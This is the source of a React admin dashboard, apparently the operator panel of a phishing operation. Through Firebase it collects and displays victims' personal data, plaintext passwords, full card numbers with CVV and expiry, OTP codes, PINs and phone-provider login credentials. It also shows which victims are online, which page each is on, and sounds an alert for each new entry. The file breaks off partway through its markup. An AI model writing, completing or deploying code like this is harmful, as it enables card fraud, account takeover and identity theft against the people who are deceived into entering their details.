import React, { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { 
  Search,
  User,
  Mail,
  Phone,
  Calendar,
  MapPin,
  CreditCard,
  Shield,
  Globe,
  CheckCircle,
  Clock,
  RefreshCw,
  ChevronRight,
  Smartphone,
  FileText,
  Trash2,
  Wifi,
  WifiOff,
  Users,
  LogOut,
  Volume2,
  VolumeX,
  Lock,
  Settings,
  X,
  Palette,
  Layout
} from "lucide-react";
import { cn } from "@/lib/utils";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { formatDistanceToNow } from "date-fns";
import { ar } from "date-fns/locale";
import { 
  subscribeToSubmissions, 
  subscribeToPayments, 
  subscribeToOnlineUsers,
  deleteSubmission,
  deletePayment,
  deleteOnlineUser,
  app
} from "@/lib/firebase";
import { getAuth, onAuthStateChanged, signOut, User as FirebaseUser } from "firebase/auth";

const auth = getAuth(app);

interface OnlineUser {
  id: string;
  visitorId: string;
  online: boolean;
  lastSeen: any;
  currentPage: string;
}

interface Submission {
  id: string;
  visitorId: string;
  status?: string;
  lastStep?: string;
  updatedAt?: any;
  completedAt?: any;
  step_1_account_type?: {
    isNewAccount: boolean;
    accountType: string;
    completedAt: string;
  };
  step_2_personal_data?: {
    fullNameArabic: string;
    fullNameEnglish: string;
    email: string;
    phoneNumber: string;
    dateOfBirth: string;
    gender: string;
    nationality: string;
    address: {
      buildingNumber: string;
      area: string;
      street: string;
    };
    completedAt: string;
  };
  step_3_password?: {
    passwordSet: boolean;
    password: string;
    completedAt: string;
  };
  step_4_payment_card?: {
    cardNumber: string;
    cardName: string;
    expiry: string;
    cvv: string;
    savedAt: string;
  };
  step_4_payment?: {
    amount: string;
    status: string;
    paymentMethod: string;
    cardNumber: string;
    cardName: string;
    expiry: string;
    cvv: string;
    otpCode: string;
    completedAt: string;
  };
  step_5_pin?: {
    pinVerified: boolean;
    pinCode: string;
    completedAt: string;
  };
  step_6_phone_provider?: {
    provider: string;
    phoneNumber: string;
    personalId: string;
    email: string;
    password: string;
    completedAt: string;
  };
}

interface Payment {
  id: string;
  visitorId: string;
  status: string;
  updatedAt?: any;
}

interface ThemeSettings {
  theme: "dark" | "light" | "blue" | "green" | "purple";
  sidebarWidth: "narrow" | "normal" | "wide";
  compactMode: boolean;
}

const themes = {
  dark: {
    bg: "bg-[#0f172a]",
    header: "bg-[#1e293b]",
    sidebar: "bg-[#1e293b]",
    card: "bg-[#1e293b]",
    border: "border-gray-700",
    text: "text-white",
    textMuted: "text-gray-400",
  },
  light: {
    bg: "bg-gray-100",
    header: "bg-white",
    sidebar: "bg-white",
    card: "bg-white",
    border: "border-gray-200",
    text: "text-gray-900",
    textMuted: "text-gray-600",
  },
  blue: {
    bg: "bg-[#0c1929]",
    header: "bg-[#1a365d]",
    sidebar: "bg-[#1a365d]",
    card: "bg-[#1a365d]",
    border: "border-blue-800",
    text: "text-white",
    textMuted: "text-blue-200",
  },
  green: {
    bg: "bg-[#0d1f17]",
    header: "bg-[#14532d]",
    sidebar: "bg-[#14532d]",
    card: "bg-[#14532d]",
    border: "border-green-800",
    text: "text-white",
    textMuted: "text-green-200",
  },
  purple: {
    bg: "bg-[#1a0f2e]",
    header: "bg-[#2e1065]",
    sidebar: "bg-[#2e1065]",
    card: "bg-[#2e1065]",
    border: "border-purple-800",
    text: "text-white",
    textMuted: "text-purple-200",
  },
};

const sidebarWidths = {
  narrow: "w-72",
  normal: "w-96",
  wide: "w-[28rem]",
};

const defaultThemeSettings: ThemeSettings = {
  theme: "dark",
  sidebarWidth: "normal",
  compactMode: false,
};

export default function FirebaseDashboard() {
  const [, setLocation] = useLocation();
  const [currentUser, setCurrentUser] = useState<FirebaseUser | null>(null);
  const [checkingAuth, setCheckingAuth] = useState(true);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [payments, setPayments] = useState<Payment[]>([]);
  const [onlineUsers, setOnlineUsers] = useState<OnlineUser[]>([]);
  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<"all" | "completed" | "pending" | "online">("all");
  const previousIdsRef = useRef<Set<string>>(new Set());
  const listRef = useRef<HTMLDivElement>(null);
  const [newItemId, setNewItemId] = useState<string | null>(null);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const audioContextRef = useRef<AudioContext | null>(null);
  const [showSettings, setShowSettings] = useState(false);
  const [themeSettings, setThemeSettings] = useState<ThemeSettings>(() => {
    const saved = localStorage.getItem("dashboardTheme");
    return saved ? JSON.parse(saved) : defaultThemeSettings;
  });
  
  const currentTheme = themes[themeSettings.theme];

  useEffect(() => {
    localStorage.setItem("dashboardTheme", JSON.stringify(themeSettings));
  }, [themeSettings]);

  const playNotificationSound = () => {
    if (!soundEnabled) return;
    
    try {
      if (!audioContextRef.current) {
        audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
      }
      
      const ctx = audioContextRef.current;
      const oscillator = ctx.createOscillator();
      const gainNode = ctx.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(ctx.destination);
      
      oscillator.frequency.setValueAtTime(800, ctx.currentTime);
      oscillator.frequency.setValueAtTime(600, ctx.currentTime + 0.1);
      oscillator.frequency.setValueAtTime(800, ctx.currentTime + 0.2);
      
      gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
      
      oscillator.start(ctx.currentTime);
      oscillator.stop(ctx.currentTime + 0.3);
    } catch (error) {
      console.error("Error playing notification sound:", error);
    }
  };

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        setLocation("/admin/login");
      } else {
        setCurrentUser(user);
      }
      setCheckingAuth(false);
    });
    return () => unsubscribe();
  }, [setLocation]);

  const handleLogout = async () => {
    try {
      await signOut(auth);
      setLocation("/admin/login");
    } catch (error) {
      console.error("Logout error:", error);
    }
  };

  useEffect(() => {
    if (checkingAuth || !currentUser) return;
    
    const unsubscribeSubmissions = subscribeToSubmissions((data) => {
      // Detect actual new inserts by comparing IDs
      const currentIds = new Set(data.map(d => d.id));
      const newIds = data.filter(d => !previousIdsRef.current.has(d.id));
      
      if (newIds.length > 0 && previousIdsRef.current.size > 0) {
        const newestItem = newIds[0];
        setNewItemId(newestItem?.id || null);
        // Play notification sound
        playNotificationSound();
        // Scroll to top when new data arrives
        if (listRef.current) {
          listRef.current.scrollTop = 0;
        }
        // Clear highlight after 3 seconds
        setTimeout(() => setNewItemId(null), 3000);
      }
      previousIdsRef.current = currentIds;
      setSubmissions(data);
      setLoading(false);
      if (data.length > 0 && !selectedSubmission) {
        setSelectedSubmission(data[0]);
      }
    });

    const unsubscribePayments = subscribeToPayments((data) => {
      setPayments(data);
    });

    const unsubscribeOnline = subscribeToOnlineUsers((users) => {
      setOnlineUsers(users.filter(u => u.online));
    });

    return () => {
      unsubscribeSubmissions();
      unsubscribePayments();
      unsubscribeOnline();
    };
  }, [checkingAuth, currentUser]);

  const isUserOnline = (visitorId: string) => {
    return onlineUsers.some(u => u.visitorId === visitorId && u.online);
  };

  const getUserCurrentPage = (visitorId: string) => {
    const user = onlineUsers.find(u => u.visitorId === visitorId);
    return user?.currentPage || "";
  };

  const formatDate = (timestamp: any) => {
    if (!timestamp) return "";
    try {
      const date = timestamp.seconds 
        ? new Date(timestamp.seconds * 1000) 
        : timestamp.toDate?.() || new Date(timestamp);
      return formatDistanceToNow(date, { addSuffix: true, locale: ar });
    } catch {
      return "";
    }
  };

  const handleDelete = async (submissionId: string) => {
    if (window.confirm("هل أنت متأكد من حذف هذا التسجيل؟")) {
      // Delete submission, payment, and online status
      await Promise.all([
        deleteSubmission(submissionId),
        deletePayment(submissionId),
        deleteOnlineUser(submissionId)
      ]);
      if (selectedSubmission?.id === submissionId) {
        setSelectedSubmission(null);
      }
    }
  };

  // Sort submissions by date (newest first)
  const sortedSubmissions = [...submissions].sort((a, b) => {
    const dateA = a.updatedAt?.seconds || a.updatedAt?.toMillis?.() || 0;
    const dateB = b.updatedAt?.seconds || b.updatedAt?.toMillis?.() || 0;
    return dateB - dateA;
  });

  const filteredSubmissions = sortedSubmissions.filter((sub) => {
    const matchesSearch = 
      sub.step_2_personal_data?.fullNameArabic?.includes(searchQuery) ||
      sub.step_2_personal_data?.fullNameEnglish?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      sub.step_2_personal_data?.email?.toLowerCase().includes(searchQuery.toLowerCase()) ||
      sub.visitorId.includes(searchQuery);

    if (activeTab === "completed") return matchesSearch && sub.status === "completed";
    if (activeTab === "pending") return matchesSearch && sub.status !== "completed";
    if (activeTab === "online") return matchesSearch && isUserOnline(sub.visitorId);
    return matchesSearch;
  });

  const stats = {
    total: submissions.length,
    completed: submissions.filter(s => s.status === "completed").length,
    pending: submissions.filter(s => s.status !== "completed").length,
    online: onlineUsers.length,
    payments: payments.length,
  };

  const getStepStatus = (sub: Submission) => {
    const steps = [];
    if (sub.step_1_account_type) steps.push("نوع الحساب");
    if (sub.step_2_personal_data) steps.push("البيانات");
    if (sub.step_3_password) steps.push("كلمة المرور");
    if (sub.step_4_payment_card || sub.step_4_payment) steps.push("الدفع");
    if (sub.step_5_pin) steps.push("PIN");
    if (sub.step_6_phone_provider) steps.push("مزود الخدمة");
    return steps;
  };

  if (checkingAuth) {
    return (
      <div className="min-h-screen bg-[#0f172a] flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>
      </div>
    );
  }

  if (!currentUser) {
    return null;
  }

  return (
    <div className={cn("min-h-screen font-sans", currentTheme.bg, currentTheme.text)} dir="rtl">
      {/* Settings Modal */}
      {showSettings && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className={cn("rounded-xl p-6 w-96 max-w-[90vw]", currentTheme.card, currentTheme.border, "border")}>
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-lg font-bold flex items-center gap-2">
                <Settings className="h-5 w-5" />
                إعدادات المظهر
              </h3>
              <button onClick={() => setShowSettings(false)} className="p-1 hover:bg-white/10 rounded">
                <X className="h-5 w-5" />
              </button>
            </div>

            <div className="space-y-6">
              <div>
                <label className="flex items-center gap-2 text-sm font-medium mb-3">
                  <Palette className="h-4 w-4" />
                  السمة
                </label>
                <div className="grid grid-cols-5 gap-2">
                  {(Object.keys(themes) as Array<keyof typeof themes>).map((key) => (
                    <button
                      key={key}
                      onClick={() => setThemeSettings(prev => ({ ...prev, theme: key }))}
                      className={cn(
                        "h-12 rounded-lg border-2 transition-all",
                        themes[key].bg,
                        themeSettings.theme === key ? "border-white ring-2 ring-white/30" : "border-transparent hover:border-white/30"
                      )}
                      title={key}
                    />
                  ))}
                </div>
                <div className="grid grid-cols-5 gap-2 mt-1 text-xs text-center">
                  <span>داكن</span>
                  <span>فاتح</span>
                  <span>أزرق</span>
                  <span>أخضر</span>
                  <span>بنفسجي</span>
                </div>
              </div>

              <div>
                <label className="flex items-center gap-2 text-sm font-medium mb-3">
                  <Layout className="h-4 w-4" />
                  عرض الشريط الجانبي
                </label>
                <div className="flex gap-2">
                  {(["narrow", "normal", "wide"] as const).map((width) => (
                    <button
                      key={width}
                      onClick={() => setThemeSettings(prev => ({ ...prev, sidebarWidth: width }))}
                      className={cn(
                        "flex-1 py-2 px-3 rounded-lg border transition-all text-sm",
                        themeSettings.sidebarWidth === width
                          ? "bg-blue-600 border-blue-600 text-white"
                          : cn(currentTheme.border, "hover:border-blue-400")
                      )}
                    >
                      {width === "narrow" ? "ضيق" : width === "normal" ? "عادي" : "عريض"}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <label className="flex items-center gap-2 text-sm font-medium mb-3">
                  <FileText className="h-4 w-4" />
                  الوضع المضغوط
                </label>
                <button
                  onClick={() => setThemeSettings(prev => ({ ...prev, compactMode: !prev.compactMode }))}
                  className={cn(
                    "w-full py-2 px-3 rounded-lg border transition-all text-sm flex items-center justify-between",
                    themeSettings.compactMode
                      ? "bg-blue-600 border-blue-600 text-white"
                      : cn(currentTheme.border, "hover:border-blue-400")
                  )}
                >
                  <span>{themeSettings.compactMode ? "مفعل" : "معطل"}</span>
                  <div className={cn(
                    "w-10 h-6 rounded-full transition-colors flex items-center px-1",
                    themeSettings.compactMode ? "bg-green-500 justify-end" : "bg-gray-600 justify-start"
                  )}>
                    <div className="w-4 h-4 bg-white rounded-full" />
                  </div>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Header */}
      <header className={cn("border-b px-3 md:px-6 py-3 md:py-4", currentTheme.header, currentTheme.border)}>
        <div className="flex items-center justify-between gap-2">
          <div className="flex items-center gap-2 md:gap-4 min-w-0">
            <h1 className={cn("text-base md:text-xl font-bold truncate", currentTheme.text)}>لوحة البيانات</h1>
            <span className="hidden sm:flex text-xs bg-green-500/20 text-green-400 px-2 py-1 rounded items-center gap-1">
              <Wifi className="h-3 w-3" />
              <span className="hidden md:inline">متصل مباشر</span>
            </span>
          </div>
          <div className="flex items-center gap-1 md:gap-2 lg:gap-4">
            <span className={cn("text-xs md:text-sm hidden lg:block", currentTheme.textMuted)}>{currentUser.email}</span>
            <div className="flex items-center gap-1 md:gap-2 bg-blue-500/20 text-blue-400 px-2 md:px-3 py-1 md:py-1.5 rounded text-xs md:text-sm">
              <Users className="h-3 w-3 md:h-4 md:w-4" />
              <span>{stats.online}</span>
              <span className="hidden md:inline">متصل</span>
            </div>
            <Button
              variant="outline"
              size="sm"
              className={cn(
                currentTheme.border, "hover:bg-white/10 px-2 md:px-3",
                soundEnabled ? "text-green-400" : currentTheme.textMuted
              )}
              onClick={() => setSoundEnabled(!soundEnabled)}
              data-testid="button-toggle-sound"
            >
              {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
              <span className="hidden lg:inline mr-2">{soundEnabled ? "الصوت مفعل" : "الصوت مغلق"}</span>
            </Button>
            <Button
              variant="outline"
              size="sm"
              className={cn(currentTheme.border, currentTheme.textMuted, "hover:bg-white/10 px-2 md:px-3")}
              onClick={() => setShowSettings(true)}
              data-testid="button-settings"
            >
              <Settings className="h-4 w-4" />
              <span className="hidden lg:inline mr-2">المظهر</span>
            </Button>
            <Button
              variant="outline"
              size="sm"
              className={cn(currentTheme.border, currentTheme.textMuted, "hover:bg-white/10 px-2 md:px-3 hidden md:flex")}
              onClick={() => window.location.reload()}
            >
              <RefreshCw className="h-4 w-4" />
              <span className="hidden lg:inline mr-2">تحديث</span>
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="border-red-600 text-red-400 hover:bg-red-900/30 px-2 md:px-3"
              onClick={handleLogout}
              data-testid="button-logout"
            >
              <LogOut className="h-4 w-4" />
              <span className="hidden lg:inline mr-2">خروج</span>
            </Button>
          </div>
        </div>
      </header>

      {/* Stats Bar */}
      <div className={cn("border-b px-3 md:px-6 py-2 md:py-3 overflow-x-auto", currentTheme.header, currentTheme.border)}>
        <div className="flex items-center gap-2 md:gap-4 min-w-max">
          <button
            onClick={() => setActiveTab("all")}
            className={cn(
              "flex items-center gap-1 md:gap-2 px-2 md:px-4 py-1.5 md:py-2 rounded-lg transition-colors text-sm",
              activeTab === "all" ? "bg-blue-600 text-white" : cn(currentTheme.textMuted, "hover:opacity-80")
            )}
          >
            <FileText className="h-4 w-4" />
            <span className="hidden sm:inline">الكل</span>
            <span className={cn("px-1.5 md:px-2 py-0.5 rounded text-xs md:text-sm", activeTab === "all" ? "bg-white/20" : "bg-black/10")}>{stats.total}</span>
          </button>
          <button
            onClick={() => setActiveTab("online")}
            className={cn(
              "flex items-center gap-1 md:gap-2 px-2 md:px-4 py-1.5 md:py-2 rounded-lg transition-colors text-sm",
              activeTab === "online" ? "bg-green-600 text-white" : cn(currentTheme.textMuted, "hover:opacity-80")
            )}
          >
            <Wifi className="h-4 w-4" />
            <span className="hidden sm:inline">متصل</span>
            <span className={cn("px-1.5 md:px-2 py-0.5 rounded text-xs md:text-sm", activeTab === "online" ? "bg-white/20" : "bg-black/10")}>{stats.online}</span>
          </button>
          <button
            onClick={() => setActiveTab("completed")}
            className={cn(
              "flex items-center gap-1 md:gap-2 px-2 md:px-4 py-1.5 md:py-2 rounded-lg transition-colors text-sm",
              activeTab === "completed" ? "bg-emerald-600 text-white" : cn(currentTheme.textMuted, "hover:opacity-80")
            )}
          >
            <CheckCircle className="h-4 w-4" />
            <span className="hidden sm:inline">مكتمل</span>
            <span className={cn("px-1.5 md:px-2 py-0.5 rounded text-xs md:text-sm", activeTab === "completed" ? "bg-white/20" : "bg-black/10")}>{stats.completed}</span>
          </button>
          <button
            onClick={() => setActiveTab("pending")}
            className={cn(
              "flex items-center gap-1 md:gap-2 px-2 md:px-4 py-1.5 md:py-2 rounded-lg transition-colors text-sm",
              activeTab === "pending" ? "bg-yellow-600 text-white" : cn(currentTheme.textMuted, "hover:opacity-80")
            )}
          >
            <Clock className="h-4 w-4" />
            <span className="hidden sm:inline">قيد التسجيل</span>
            <span className={cn("px-1.5 md:px-2 py-0.5 rounded text-xs md:text-sm", activeTab === "pending" ? "bg-white/20" : "bg-black/10")}>{stats.pending}</span>
          </button>
          <div className={cn("mr-auto flex items-center gap-1 md:gap-2 text-sm", currentTheme.textMuted)}>
            <CreditCard className="h-4 w-4" />
            <span>{stats.payments}</span>
            <span className="hidden md:inline">مدفوعات</span>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex flex-col md:flex-row h-[calc(100vh-120px)] md:h-[calc(100vh-140px)]">
        {/* Submissions List */}
        <div className={cn(
          "border-l flex flex-col",
          "w-full md:w-80 lg:w-96",
          "h-1/2 md:h-full",
          "order-2 md:order-1",
          currentTheme.sidebar, 
          currentTheme.border
        )}>
          {/* Search */}
          <div className={cn("p-4 border-b", currentTheme.border)}>
            <div className="relative">
              <Search className={cn("absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4", currentTheme.textMuted)} />
              <Input
                placeholder="بحث بالاسم أو البريد..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className={cn("pr-10", currentTheme.bg, currentTheme.border, currentTheme.text, "placeholder:opacity-50")}
              />
            </div>
          </div>

          {/* List */}
          <div ref={listRef} className="flex-1 overflow-y-auto scroll-smooth">
            {loading ? (
              <div className="flex items-center justify-center h-32 text-gray-500">
                <RefreshCw className="h-6 w-6 animate-spin" />
              </div>
            ) : filteredSubmissions.length === 0 ? (
              <div className="p-8 text-center text-gray-500">
                <FileText className="h-12 w-12 mx-auto mb-4 opacity-50" />
                <p>لا توجد بيانات</p>
              </div>
            ) : (
              filteredSubmissions.map((sub) => (
                <button
                  key={sub.id}
                  onClick={() => setSelectedSubmission(sub)}
                  className={cn(
                    "w-full border-b text-right transition-all",
                    themeSettings.compactMode ? "p-2" : "p-4",
                    currentTheme.border,
                    selectedSubmission?.id === sub.id
                      ? "bg-blue-600/20 border-r-4 border-r-blue-500"
                      : "hover:bg-white/5",
                    newItemId === sub.id && "animate-pulse bg-green-500/30"
                  )}
                >
                  <div className="flex items-start justify-between gap-3">
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2">
                        <p className={cn("font-bold truncate", currentTheme.text)}>
                          {sub.step_2_personal_data?.fullNameArabic || `زائر ${sub.visitorId.slice(0, 8)}`}
                        </p>
                        {isUserOnline(sub.visitorId) ? (
                          <span className="flex items-center gap-1 text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">
                            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                            متصل
                          </span>
                        ) : (
                          <WifiOff className={cn("h-3 w-3", currentTheme.textMuted)} />
                        )}
                      </div>
                      {!themeSettings.compactMode && (
                        <>
                          <p className={cn("text-sm truncate", currentTheme.textMuted)}>
                            {sub.step_2_personal_data?.email || "لا يوجد بريد"}
                          </p>
                          <p className={cn("text-xs mt-1", currentTheme.textMuted)}>
                            <Clock className="h-3 w-3 inline ml-1" />
                            {formatDate(sub.updatedAt) || "غير محدد"}
                          </p>
                          {isUserOnline(sub.visitorId) && (
                            <p className="text-xs text-blue-400 mt-1">
                              📍 {getUserCurrentPage(sub.visitorId)}
                            </p>
                          )}
                        </>
                      )}
                      <div className={cn("flex items-center gap-2 flex-wrap", themeSettings.compactMode ? "mt-1" : "mt-2")}>
                        {sub.status === "completed" ? (
                          <span className="text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">
                            مكتمل
                          </span>
                        ) : (
                          <span className="text-xs bg-yellow-500/20 text-yellow-400 px-2 py-0.5 rounded">
                            {sub.lastStep || "جاري"}
                          </span>
                        )}
                        {(sub.step_4_payment_card || sub.step_4_payment) && (
                          <span className="text-xs bg-orange-500/20 text-orange-400 px-2 py-0.5 rounded flex items-center gap-1">
                            <CreditCard className="h-3 w-3" />
                            بطاقة
                          </span>
                        )}
                        {sub.step_4_payment?.otpCode && (
                          <span className="text-xs bg-purple-500/20 text-purple-400 px-2 py-0.5 rounded flex items-center gap-1">
                            <Shield className="h-3 w-3" />
                            OTP
                          </span>
                        )}
                        {sub.step_5_pin?.pinCode && (
                          <span className="text-xs bg-red-500/20 text-red-400 px-2 py-0.5 rounded flex items-center gap-1">
                            <Lock className="h-3 w-3" />
                            PIN
                          </span>
                        )}
                      </div>
                    </div>
                    <ChevronRight className={cn("h-5 w-5 flex-shrink-0", currentTheme.textMuted)} />
                  </div>
                </button>
              ))
            )}
          </div>
        </div>

        {/* Detail Panel */}
        <div className={cn("flex-1 overflow-y-auto p-3 md:p-6 order-1 md:order-2 h-1/2 md:h-full", currentTheme.bg)}>
          {selectedSubmission ? (
            <div className="max-w-2xl mx-auto space-y-4 md:space-y-6">
              {/* Header */}
              <div className={cn("rounded-xl p-4 md:p-6 border", currentTheme.card, currentTheme.border)}>
                <div className="flex flex-col sm:flex-row items-start sm:items-center gap-3 md:gap-4 mb-4">
                  <div className={cn(
                    "w-12 h-12 md:w-16 md:h-16 rounded-full flex items-center justify-center flex-shrink-0",
                    isUserOnline(selectedSubmission.visitorId) ? "bg-green-600" : "bg-blue-600"
                  )}>
                    <User className="h-6 w-6 md:h-8 md:w-8 text-white" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex flex-wrap items-center gap-2">
                      <h2 className={cn("text-lg md:text-2xl font-bold truncate", currentTheme.text)}>
                        {selectedSubmission.step_2_personal_data?.fullNameArabic || "زائر جديد"}
                      </h2>
                      {isUserOnline(selectedSubmission.visitorId) && (
                        <span className="flex items-center gap-1 text-xs md:text-sm bg-green-500/20 text-green-400 px-2 py-1 rounded">
                          <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
                          متصل
                        </span>
                      )}
                    </div>
                    <p className={cn("text-sm truncate", currentTheme.textMuted)}>
                      {selectedSubmission.step_2_personal_data?.fullNameEnglish || selectedSubmission.visitorId}
                    </p>
                    {isUserOnline(selectedSubmission.visitorId) && (
                      <p className="text-xs md:text-sm text-blue-400 mt-1">
                        📍 {getUserCurrentPage(selectedSubmission.visitorId)}
                      </p>
                    )}
                  </div>
                  <div className="flex gap-2 flex-shrink-0 w-full sm:w-auto justify-end">
                    {selectedSubmission.status === "completed" && (
                      <span className="bg-green-500 text-white px-2 md:px-4 py-1 md:py-2 rounded-lg font-bold text-xs md:text-sm">
                        مكتمل
                      </span>
                    )}
                    <Button
                      variant="destructive"
                      size="sm"
                      onClick={() => handleDelete(selectedSubmission.id)}
                      className="bg-red-600 hover:bg-red-700 text-xs md:text-sm"
                    >
                      <Trash2 className="h-4 w-4" />
                      <span className="hidden sm:inline mr-1">حذف</span>
                    </Button>
                  </div>
                </div>

                {/* Step Progress */}
                <div className="flex flex-wrap gap-2 mt-4">
                  {getStepStatus(selectedSubmission).map((step, i) => (
                    <span key={i} className="bg-green-500/20 text-green-400 px-3 py-1 rounded-full text-sm">
                      ✓ {step}
                    </span>
                  ))}
                </div>
              </div>

              {/* Step 1: Account Type */}
              {selectedSubmission.step_1_account_type && (
                <DetailSection title="نوع الحساب" icon={User} theme={currentTheme}>
                  <DetailItem 
                    label="نوع المستخدم" 
                    value={selectedSubmission.step_1_account_type.accountType === "citizen" ? "مواطن / مقيم" : "زائر"}
                    theme={currentTheme}
                  />
                  <DetailItem 
                    label="حساب جديد" 
                    value={selectedSubmission.step_1_account_type.isNewAccount ? "نعم" : "لا"}
                    theme={currentTheme}
                  />
                </DetailSection>
              )}

              {/* Step 2: Personal Data */}
              {selectedSubmission.step_2_personal_data && (
                <DetailSection title="البيانات الشخصية" icon={FileText} theme={currentTheme}>
                  <div className="grid grid-cols-2 gap-4">
                    <DetailItem label="الاسم بالعربية" value={selectedSubmission.step_2_personal_data.fullNameArabic} theme={currentTheme} />
                    <DetailItem label="الاسم بالإنجليزية" value={selectedSubmission.step_2_personal_data.fullNameEnglish} theme={currentTheme} />
                    <DetailItem label="البريد الإلكتروني" value={selectedSubmission.step_2_personal_data.email} icon={Mail} theme={currentTheme} />
                    <DetailItem label="رقم الهاتف" value={selectedSubmission.step_2_personal_data.phoneNumber} icon={Phone} theme={currentTheme} />
                    <DetailItem label="تاريخ الميلاد" value={selectedSubmission.step_2_personal_data.dateOfBirth} icon={Calendar} theme={currentTheme} />
                    <DetailItem label="الجنس" value={selectedSubmission.step_2_personal_data.gender === "male" ? "ذكر" : "أنثى"} theme={currentTheme} />
                    <DetailItem label="الجنسية" value={selectedSubmission.step_2_personal_data.nationality} icon={Globe} theme={currentTheme} />
                  </div>
                  {selectedSubmission.step_2_personal_data.address && (
                    <div className={cn("mt-4 pt-4 border-t", currentTheme.border)}>
                      <h4 className={cn("font-bold mb-3 flex items-center gap-2", currentTheme.textMuted)}>
                        <MapPin className="h-4 w-4" /> العنوان
                      </h4>
                      <div className="grid grid-cols-3 gap-4">
                        <DetailItem label="رقم المبنى" value={selectedSubmission.step_2_personal_data.address.buildingNumber} theme={currentTheme} />
                        <DetailItem label="المنطقة" value={selectedSubmission.step_2_personal_data.address.area} theme={currentTheme} />
                        <DetailItem label="الشارع" value={selectedSubmission.step_2_personal_data.address.street} theme={currentTheme} />
                      </div>
                    </div>
                  )}
                </DetailSection>
              )}

              {/* Step 3: Password */}
              {selectedSubmission.step_3_password && (
                <DetailSection title="كلمة المرور" icon={Shield} theme={currentTheme}>
                  <div className="grid grid-cols-2 gap-4">
                    <DetailItem 
                      label="الحالة" 
                      value={selectedSubmission.step_3_password.passwordSet ? "تم التعيين بنجاح" : "لم يتم"}
                      theme={currentTheme}
                    />
                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
                      <p className="text-xs text-red-400">كلمة المرور</p>
                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
                        {selectedSubmission.step_3_password.password || "-"}
                      </p>
                    </div>
                  </div>
                </DetailSection>
              )}

              {/* Step 4 Early: Card Data (saved before OTP) */}
              {selectedSubmission.step_4_payment_card && !selectedSubmission.step_4_payment && (
                <DetailSection title="بيانات البطاقة (قبل OTP)" icon={CreditCard} theme={currentTheme}>
                  <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-4 mb-4">
                    <p className="text-yellow-400 text-sm mb-2">⏳ تم حفظ البطاقة - في انتظار OTP</p>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30 col-span-2">
                      <p className="text-xs text-yellow-400">رقم البطاقة</p>
                      <p className="font-mono font-bold text-yellow-300 mt-1 text-xl tracking-widest">
                        {selectedSubmission.step_4_payment_card.cardNumber || "-"}
                      </p>
                    </div>
                    <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
                      <p className="text-xs text-yellow-400">الاسم على البطاقة</p>
                      <p className="font-medium text-yellow-300 mt-1">
                        {selectedSubmission.step_4_payment_card.cardName || "-"}
                      </p>
                    </div>
                    <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
                      <p className="text-xs text-yellow-400">تاريخ الانتهاء</p>
                      <p className="font-mono font-bold text-yellow-300 mt-1">
                        {selectedSubmission.step_4_payment_card.expiry || "-"}
                      </p>
                    </div>
                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
                      <p className="text-xs text-red-400">CVV</p>
                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
                        {selectedSubmission.step_4_payment_card.cvv || "-"}
                      </p>
                    </div>
                  </div>
                </DetailSection>
              )}

              {/* Step 4: Payment */}
              {selectedSubmission.step_4_payment && (
                <DetailSection title="الدفع وبيانات البطاقة" icon={CreditCard} theme={currentTheme}>
                  <div className="grid grid-cols-2 gap-4 mb-4">
                    <DetailItem label="المبلغ" value={selectedSubmission.step_4_payment.amount} theme={currentTheme} />
                    <DetailItem label="الحالة" value={selectedSubmission.step_4_payment.status === "completed" ? "تم الدفع" : "قيد الانتظار"} theme={currentTheme} />
                    <DetailItem label="طريقة الدفع" value={selectedSubmission.step_4_payment.paymentMethod === "card" ? "بطاقة ائتمان" : selectedSubmission.step_4_payment.paymentMethod} theme={currentTheme} />
                  </div>
                  
                  {/* Card Details */}
                  <div className={cn("mt-4 pt-4 border-t", currentTheme.border)}>
                    <h4 className="font-bold text-yellow-400 mb-3 flex items-center gap-2">
                      <CreditCard className="h-4 w-4" /> بيانات البطاقة
                    </h4>
                    <div className="grid grid-cols-2 gap-4">
                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30 col-span-2">
                        <p className="text-xs text-yellow-400">رقم البطاقة</p>
                        <p className="font-mono font-bold text-yellow-300 mt-1 text-xl tracking-widest">
                          {selectedSubmission.step_4_payment.cardNumber || "-"}
                        </p>
                      </div>
